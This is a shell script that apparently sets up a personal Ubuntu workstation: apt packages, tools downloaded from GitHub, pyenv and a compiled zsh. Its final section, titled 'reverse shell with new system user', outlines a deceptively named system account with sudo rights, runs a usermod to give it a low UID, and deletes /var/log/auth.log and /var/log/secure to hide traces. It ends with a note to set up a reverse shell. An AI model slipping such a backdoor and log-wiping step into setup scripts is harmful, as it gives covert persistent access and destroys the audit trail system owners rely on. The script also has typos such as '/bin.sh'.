#! /bin.sh
# make required directories
mkdir ~/repos ~/software ~/sysadmin

# install commonly used and dependencies with apt
sudo apt-get update && sudo apt-get install $(grep -vE "^\s*#" aptpackages.txt  | tr "\n" " ")
sudo apt-get -u upgrade; sudo apt-get dist-upgrade; sudo apt-get autoclean; sudo apt-get autoremove
## install livepatch: Apply critical kernel patches without rebooting.
sudo snap install canonical-livepatch

# install other handy packages
## bat, cat replacement that is faster and has git integration
### get latest amd_64.deb release from Github repo, install and clean
BAT_GHREPO="sharkdp/bat"
curl -s https://api.github.com/repos/$BAT_GHREPO/releases/latest | jq -r ".assets[] | select(.name | contains(\"amd64.deb\")) | .browser_download_url" | wget -i - && sudo dpkg -i bat_*_amd64.deb
rm -rf bat*.deb*
## fd: fast and fancy find alternative
FD_GHREPO="sharkdp/fd"
curl -s https://api.github.com/repos/$FD_GHREPO/releases/latest | jq -r ".assets[] | select(.name | contains(\"amd64.deb\")) | .browser_download_url" | wget -i - && sudo dpkg -i fd_*_amd64.deb
rm -rf fd*.deb*
## prettyping visually pleasing pleasing ping
curl -O https://raw.githubusercontent.com/denilsonsa/prettyping/master/prettyping && chmod +x prettyping && sudo mv prettyping /usr/bin/
## NCDU: pretty disk usage alternative to du, let's you delete too.
wget https://dev.yorhel.nl/download/ncdu-1.14.tar.gz && tar -xzf ncdu-*.tar.gz && cd ncd-* && ./configure --prefix=/usr && make && sudo make install
cd - && rm -rf ncdu-*
## RG Ripgrep: world's fastest grep; cmd = rg
RIPGREP_GHREPO="BurntSushi/ripgrep"
curl -s https://api.github.com/repos/$RIPGREP_GHREPO/releases/latest | jq -r ".assets[] | select(.name | contains(\"amd64.deb\")) | .browser_download_url" | wget -i - && sudo dpkg -i ripgrep_*_amd64.deb
rm -rf ripgrep*.deb*

# update locale to get rid of annoying message
sudo update-locale LC_ALL=en_US.UTF-8 LANG=en_US.UTF-8

# install pyenv + set global to latest python ver + pipenv/pip
git clone https://github.com/pyenv/pyenv.git ~/.pyenv
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.bashrc
## load pyenv path vars
exec "$SHELL"
## install latest Python3 build and set as global
git clone https://github.com/momo-lab/xxenv-latest.git "$HOME/.pyenv"/plugins/xxenv-latest
pyenv latest install
pyenv latest global
## pipenv, install my commonly used tools from reqfile
pip install --upgrade pip
pip install -r pythonmodules.txt

# setup latest zsh + copy zshrc and zshenv
## download latest zsh + unpack + remove downloaded file
wget -O zsh-latest https://sourceforge.net/projects/zsh/files/latest/download && tar -xJf zsh-latest && rm -rf ./zsh-latest
## compile zsh and copy config
cd zsh-* && ./configure && make && make test && sudo make install && cd -
cp .zshrc ~/.zshrc
cp .zshenv ~/.zshenv
## install zplug and run to install plugins
cd ~ && curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh; cd -
## make zsh default $SHELL, you might want to manually check if it works first.
which zsh | sudo tee -a /etc/shells
chsh -s $(which zsh)
## cleanup
rm -rf zsh-*

# install + config git

# copy/create RSAid (needed for openssh hosts config)

# openssh config with my hosts

# reverse shell with new system user
## make a new user with custom-home and assign id below 100 so it is registered as a system githubusercontent
### give common system user name to deceive
### custom HOME not in /home
### add to sudoers
sudo usermod -u 999 ben

### remove traces and logs pertaining to user creation: https://www.2daygeek.com/how-to-check-user-created-date-on-linux/
rm -rf /var/log/auth.log /var/log/secure
## revshell that shit
